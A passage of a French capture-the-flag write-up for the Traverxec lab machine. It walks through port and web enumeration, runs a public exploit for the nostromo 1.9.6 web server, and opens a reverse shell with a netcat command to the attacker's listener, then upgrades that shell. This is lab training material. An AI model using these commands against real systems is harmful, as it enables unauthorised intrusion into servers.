![Pic1](../img/traverxec1.PNG?raw=true) </br>

# Présentation
Traverxec est une box Linux dont l'adresse IP est 10.10.10.165.</br>

Compétences mises en oeuvre :</br>
* Enumération des ports et services d'une machine distante.


</br>

# Enumération initiale

Nous commençons l'énumération par les ports et services disponibles avec nmap :
```bash
$ nmap -T4 -A 10.10.10.165
```
![Pic2](../img/traverxec2.PNG?raw=true) </br>
Deux ports sont ouverts :</br>
* 22 pour un OpenSSH en version 7.9
* 80 pour un serveur web nostromo en version 1.9.6
</br>

Nous allons faire une énumération des fichiers et dossiers présents sur le site web avec dirsearch :  
```bash
$ dirsearch -w wordlist -e "php,txt" -f -t 100 -x 400,403,404,501 -u http://10.10.10.165/
```
![Pic3](../img/traverxec3.PNG?raw=true) </br>

# Obtenir un accès utilisateur
Nous avons vu que le serveur web en écoute était un nostromo 1.9.6, ce qui n'est pas commun, nous allons voir s'il existe un exploit pour 
cette version avec searchsploit :
```bash
$ searchsploit nostromo
```
![Pic4](../img/traverxec4.PNG?raw=true) </br>

Nous allons chercher la RCE qui correspond à la version de nostromo et l'executer :
```bash
$ locate 47837.py
$ cp /usr/share/exploitdb/exploits/multiple/remote/47837.py ./
$ cat 47837.py
```
![Pic5](../img/traverxec5.PNG?raw=true) </br>
Pour l'utiliser, il faut mettre en argumant l'ip de la box + son port + la commande à exécuter, donc nous testons :
```bash
$ python 47837.py 10.10.10.165 80 hostname
```
![Pic6](../img/traverxec6.PNG?raw=true) </br>
Nous allons alors utiliser le netcat de la box pour obtenir un shell :
```bash
# Nous mettons un listener sur notre machine :
$ nc -lvnp 4567
# Toujours sur notre machine mais sur un autre shell :
$ python 47837.py 10.10.10.165 80 "nc 10.10.14.6 4567 -c bash"
```
![Pic7](../img/traverxec7.PNG?raw=true) </br>
Nous avons un shell en tant que www-data, nous allons faire de l'énumération de base :
```bash
$ python -c "import pty;pty.spawn('/bin/bash')"
$ find / -type d -perm 0755 2>/dev/null
```
![Pic8](../img/traverxec8.PNG?raw=true) </br>
Un résultat plutot dense mais nous pouvons voir que nous avons accès a plusieurs fichiers de Nostromo, y compris son fichier de configuration :
```bash
